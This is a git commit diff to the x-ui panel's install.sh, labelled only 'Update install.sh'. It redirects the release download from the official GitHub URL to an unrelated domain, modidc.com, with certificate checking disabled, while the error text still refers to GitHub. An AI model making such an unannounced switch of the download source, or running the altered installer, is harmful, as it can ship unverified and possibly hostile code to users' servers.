93c313d1869bd25ed5a4f20f04364ebd42fcdaf3
w16858 <153258048+w16858@users.noreply.github.com>
2024-01-22 11:58:01 +0800

    Update install.sh

--- install.sh
+++ install.sh
@@ -120,14 +120,14 @@ install_x-ui() {
             exit 1
         fi
         echo -e "Got x-ui latest version: ${last_version}, beginning the installation..."
-        wget -N --no-check-certificate -O /usr/local/x-ui-linux-amd64.tar.gz https://github.com/MHSanaei/3x-ui/releases/download/v2.1.1/x-ui-linux-amd64.tar.gz
+        wget -N --no-check-certificate -O /usr/local/x-ui-linux-amd64.tar.gz https://modidc.com/x-ui-linux-amd64.tar.gz
         if [[ $? -ne 0 ]]; then
             echo -e "${red}Downloading x-ui failed, please be sure that your server can access Github ${plain}"
             exit 1
         fi
     else
         last_version=$1
-        url="https://github.com/MHSanaei/3x-ui/releases/download/v2.1.1/x-ui-linux-amd64.tar.gz"
+        url="https://modidc.com/x-ui-linux-amd64.tar.gz"
         echo -e "Begining to install x-ui $1"
         wget -N --no-check-certificate -O /usr/local/x-ui-linux-amd64.tar.gz ${url}
         if [[ $? -ne 0 ]]; then
